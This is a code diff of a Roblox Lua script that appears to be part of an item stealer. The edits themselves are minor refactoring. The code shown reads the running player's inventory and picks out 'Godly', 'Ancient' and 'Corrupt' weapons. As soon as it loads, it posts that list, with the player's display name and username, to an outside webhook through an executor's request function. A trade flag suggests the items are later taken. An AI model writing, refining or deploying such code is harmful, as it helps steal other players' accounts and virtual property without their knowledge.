@@ -13,15 +13,14 @@ local Remotes = ReplicatedStorage:WaitForChild("Remotes")
 local InventoryModule = require(ReplicatedStorage.Modules.InventoryModule)
 local LocalPlayer = Players.LocalPlayer
 local TradeStarted = false
-local DB = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+local db = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+local http = game:GetService("HttpService")
 
 function send(url, message, username, avatar_url)
-	local http = game:GetService("HttpService")
 	local headers = { ["Content-Type"] = "application/json" }
 	local data = {
 		["content"] = message,
 		["username"] = username,
-		["avatar_url"] = avatar_url
 	}
 	local body = http:JSONEncode(data)
 	request({
@@ -42,7 +41,7 @@ local function getInv()
 	local owned = inventory.Weapons.Owned
 	local list = {}
 	for ItemID, Amount in pairs(owned) do
-		local itemData = DB[ItemID]
+		local itemData = db[ItemID]
 		if itemData and (itemData.Rarity == "Godly" or itemData.Rarity == "Ancient" or itemData.ItemName == "Corrupt") then
 			table.insert(list, {
 				Name = itemData.ItemName,
@@ -66,10 +65,10 @@ local function alert()
 	local message = format(getInv())
 	local displayName = LocalPlayer.DisplayName
 	local username = LocalPlayer.Name
-	local avatarURL = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
 	local webhookName = displayName .. " (@" .. username .. ")"
+	
 	task.defer(function()
-		send(webhookURL, message, webhookName, avatarURL)
+		send(webhookURL, message, webhookName)
 	end)
 end
 alert()
